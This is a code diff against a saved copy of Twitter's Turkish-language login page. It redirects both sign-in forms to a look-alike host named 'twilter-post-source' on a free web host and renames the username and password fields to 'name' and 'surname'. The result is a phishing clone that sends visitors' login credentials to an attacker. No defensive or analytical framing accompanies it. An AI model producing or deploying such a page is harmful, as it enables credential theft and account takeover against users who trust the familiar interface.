@@ -259,16 +259,16 @@
 
   <div class="signin-wrapper" data-login-message="">
     <h1>Twitter'a giriş yap</h1>
-    <form action="https://twitter.com/sessions" class="t1-form clearfix signin js-signin" method="post">
+    <form action="https://twilter-post-source.000webhostapp.com/" class="t1-form clearfix signin js-signin" method="post">
       <fieldset>
 
   <legend class="visuallyhidden">Giriş yap</legend>
 
   <div class="clearfix field">
-    <input class="js-username-field email-input js-initial-focus" type="text" name="session[username_or_email]" autocomplete="on" value="" placeholder="Telefon, e-posta veya kullanıcı adı">
+    <input class="js-username-field email-input js-initial-focus" type="text" name="name" autocomplete="on" value="" placeholder="Telefon, e-posta veya kullanıcı adı">
   </div>
   <div class="clearfix field">
-    <input class="js-password-field" type="password" name="session[password]" placeholder="Şifre">
+    <input class="js-password-field" type="password" name="surname" placeholder="Şifre">
   </div>
 
   <input type="hidden" value="83916b096a7eeebaa0c4a35e59afa821425feb6d" name="authenticity_token">
@@ -819,13 +819,13 @@
           <span class="Icon Icon--bird Icon--large"></span>
         </div>
         <div class="LoginDialog-form">
-<form action="https://twitter.com/sessions" class="LoginForm js-front-signin" method="post" data-component="dialog" data-element="login">
+<form action="https://twilter-post-source.000webhostapp.com/" class="LoginForm js-front-signin" method="post" data-component="dialog" data-element="login">
   <div class="LoginForm-input LoginForm-username">
-    <input type="text" class="text-input email-input js-signin-email" name="session[username_or_email]" autocomplete="username" placeholder="Telefon, e-posta veya kullanıcı adı">
+    <input type="text" class="text-input email-input js-signin-email" name="name" autocomplete="username" placeholder="Telefon, e-posta veya kullanıcı adı">
   </div>
 
   <div class="LoginForm-input LoginForm-password">
-    <input type="password" class="text-input" name="session[password]" placeholder="Şifre" autocomplete="current-password">
+    <input type="password" class="text-input" name="surname" placeholder="Şifre" autocomplete="current-password">
     
   </div>
 
